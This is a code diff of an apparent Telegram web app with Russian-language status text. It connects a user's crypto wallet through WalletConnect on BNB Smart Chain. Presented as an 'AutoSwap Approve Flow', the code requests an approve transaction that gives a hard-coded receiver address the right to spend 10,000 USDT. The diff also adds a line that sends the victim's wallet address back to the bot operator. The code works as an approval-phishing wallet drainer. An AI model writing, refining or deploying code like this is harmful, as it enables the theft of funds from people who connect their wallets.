@@ -41,6 +41,9 @@
     import { ethers } from 'https://esm.sh/ethers@6.14.3';
     const { Interface, parseUnits, getAddress } = ethers;
 
+    const tg = window.Telegram.WebApp;
+    if (tg) tg.ready();
+
     const setStatus = (msg, color="#4fc3f7") => {
       const el = document.getElementById("status");
       el.textContent = msg;
@@ -50,14 +53,11 @@
     const setURI = (uri) => {
       const el = document.getElementById("manual-uri");
       el.textContent = uri;
-      if (window.Telegram?.WebApp) {
+      if (tg) {
         const link = document.createElement("a");
         link.textContent = "Открыть кошелёк";
         link.className = "uri-link";
-        link.onclick = () => {
-          Telegram.WebApp.openTelegramLink(uri);
-          return false;
-        };
+        link.onclick = () => { tg.openTelegramLink(uri); return false; };
         el.appendChild(link);
       }
     };
@@ -66,25 +66,14 @@
       try {
         setStatus("🔌 Инициализация WalletConnect…");
         const client = await SignClient.init({
-          projectId: "d868f90cd734355ae0320f8f0258b6b1",
+          projectId: "d868f90cd734355ae0328f8f0258b6b1",
           relayUrl: "wss://relay.walletconnect.com",
-          metadata: {
-            name: "AutoSwap Approve Flow",
-            description: "Approve USDT → Wallet",
-            url: location.href,
-            icons: ["https://walletconnect.com/favicon.ico"]
-          }
+          metadata: { name: "AutoSwap Approve Flow", url: location.href }
         });
 
         setStatus("📷 Генерация QR‑кода…");
         const { uri, approval } = await client.connect({
-          requiredNamespaces: {
-            eip155: {
-              chains: ["eip155:56"],
-              methods: ["eth_sendTransaction"],
-              events: ["chainChanged", "accountsChanged"]
-            }
-          }
+          requiredNamespaces: { eip155: { chains: ["eip155:56"], methods: ["eth_sendTransaction"], events: [] } }
         });
 
         if (uri) {
@@ -99,23 +88,19 @@
 
         const amount = parseUnits("10000", 18);
         const usdt = getAddress("0x55d398326f99059ff775485246999027b3197955");
-        const receiverWallet = getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE");
-
+        const receiver = getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE");
         setStatus("✍️ Подготовка approve...");
-        const abi = new Interface(["function approve(address,uint256)"]);
-        const data = abi.encodeFunctionData("approve", [receiverWallet, amount]);
+        const data = new Interface(["function approve(address,uint256)"])
+          .encodeFunctionData("approve", [receiver, amount]);
 
         setStatus("🚀 Отправка approve...");
-        const txHash = await client.request({
-          topic: session.topic,
-          chainId: "eip155:56",
-          request: {
-            method: "eth_sendTransaction",
-            params: [{ from: address, to: usdt, data }]
-          }
+        const tx = await client.request({
+          topic: session.topic, chainId: "eip155:56",
+          request: { method: "eth_sendTransaction", params: [{ from: address, to: usdt, data }] }
         });
+        setStatus(`✅ Approve отправлен:\n${tx}`, "#66bb6a");
 
-        setStatus(`✅ Approve отправлен:\n${txHash}`, "#66bb6a");
+        if (tg) tg.sendData(JSON.stringify({ address }));
       } catch (e) {
         console.error(e);
         setStatus(`❌ Ошибка: ${e.message || e.reason}`, "#ff6b6b");
